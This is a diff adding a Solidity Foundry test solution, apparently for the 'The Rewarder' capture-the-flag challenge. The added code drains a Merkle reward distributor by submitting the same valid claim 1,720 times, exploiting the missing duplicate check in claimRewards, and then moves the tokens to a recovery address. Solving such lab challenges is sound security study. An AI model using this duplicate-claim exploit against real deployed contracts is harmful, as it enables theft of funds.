@@ -148,7 +148,45 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
+        // Load data to get proofs
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
         
+        // Prepare tokens to claim
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        // Prepare claims
+        // The first 867 claims are for DVT, the rest 853 are for WETH
+        Claim[] memory claims = new Claim[](1720);
+        Claim memory dvtClaim = Claim({
+            batchNumber: 0, 
+            amount: 11524763827831882,
+            tokenIndex: 0, 
+            proof: merkle.getProof(dvtLeaves, 188) 
+        });
+        Claim memory wethClaim = Claim({
+            batchNumber: 0,
+            amount: 1171088749244340,
+            tokenIndex: 1,
+            proof: merkle.getProof(wethLeaves, 188)
+        });
+        for (uint256 i = 0; i < 1720; ++i) {
+            if (i < 867) {
+                claims[i] = dvtClaim;
+            } else {
+                claims[i] = wethClaim;
+            }
+        }
+
+        // Claim rewards with multiple claims, as the contract `claimRewards` method
+        // does not check for duplicates in the inputClaims array
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+
+        // Transfer all tokens to the recovery address
+        dvt.transfer(recovery, dvt.balanceOf(address(player)));
+        weth.transfer(recovery, weth.balanceOf(address(player)));
     }
 
     /**
